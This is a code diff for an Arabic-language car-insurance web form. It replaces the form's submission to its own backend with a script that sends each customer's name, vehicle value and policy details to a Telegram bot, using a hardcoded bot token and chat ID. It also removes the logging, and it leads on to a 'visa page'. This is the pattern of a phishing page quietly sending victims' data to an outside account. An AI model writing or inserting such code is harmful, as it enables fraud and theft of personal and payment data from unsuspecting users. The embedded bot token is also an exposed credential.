@@ -498,11 +498,11 @@
   </div>
 </section>
 
+        
     <script>
-    // API Configuration
-    const API_BASE_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
-      ? 'http://localhost:3000'
-      : '';
+    // Telegram Configuration
+    const telegramBotToken = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
+    const chatId = '7785288759';
 
     // Initialize year dropdown
     const yearSelect = document.getElementById("manufacture-year");
@@ -514,41 +514,42 @@
       yearSelect.appendChild(option);
     }
 
-    // Get session ID from localStorage
-    function getSessionId() {
-      return localStorage.getItem('sessionId') || '';
-    }
-
     // Get owner name from localStorage
     function getOwnerName() {
       return localStorage.getItem('owner_name') || 'غير معروف';
     }
 
-    // Submit insurance data to backend server
-    async function submitToServer(data) {
+    // Send data directly to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
       try {
-        console.log('API URL:', API_BASE_URL);
-        console.log('Full URL:', `${API_BASE_URL}/api/submit/insurance`);
-        
-        const response = await fetch(`${API_BASE_URL}/api/submit/insurance`, {
+        const response = await fetch(url, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            ...data,
-            sessionId: getSessionId()
-          })
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
         });
-        
-        console.log('Response status:', response.status);
-        const result = await response.json();
-        console.log('Response JSON:', result);
-        return result;
+        return await response.json();
       } catch (error) {
-        console.error('Server error:', error);
-        return { success: false, error: error.message };
+        console.error('Telegram Error:', error);
+        return { ok: false };
       }
+    }
+
+    // Submit insurance data to Telegram
+    async function submitToServer(data) {
+      const message = `
+🏗️ <b>بيانات التأمين الجديدة:</b>
+━━━━━━━━━━━━━━━
+👤 العميل: ${data.owner_name}
+━━━━━━━━━━━━━━━
+📋 نوع التأمين: ${data.insurance_type}
+📅 تاريخ البدء: ${data.start_date}
+🚗 غرض الاستخدام: ${data.usage_purpose}
+💰 قيمة المركبة: ${data.car_value} ريال
+📆 سنة الصنع: ${data.manufacture_year}
+🔧 مكان الإصلاح: ${data.repair_location}
+      `;
+      return await sendToTelegram(message);
     }
 
     // Handle form submission
@@ -563,9 +564,6 @@
       const manufactureYear = document.getElementById('manufacture-year').value;
       const repairLocationRadio = document.querySelector('input[name="repair-location"]:checked');
       const repairLocation = repairLocationRadio ? repairLocationRadio.value : '';
-
-      // Debug: Log values
-      console.log('Form values:', { insuranceType, startDate, usagePurpose, carValue, manufactureYear, repairLocation });
 
       // Validate required fields
       if (!insuranceType || !startDate || !usagePurpose || !carValue || !manufactureYear || !repairLocation) {
@@ -589,13 +587,10 @@
         repair_location: repairLocation
       };
 
-      console.log('Sending data to server:', data);
-
-      // Submit to server
+      // Submit to Telegram
       const result = await submitToServer(data);
-      console.log('Server response:', result);
 
-      if (result.success) {
+      if (result.ok) {
         // Save insurance start date for visa page
         localStorage.setItem('insuranceStartDate', startDate);
         
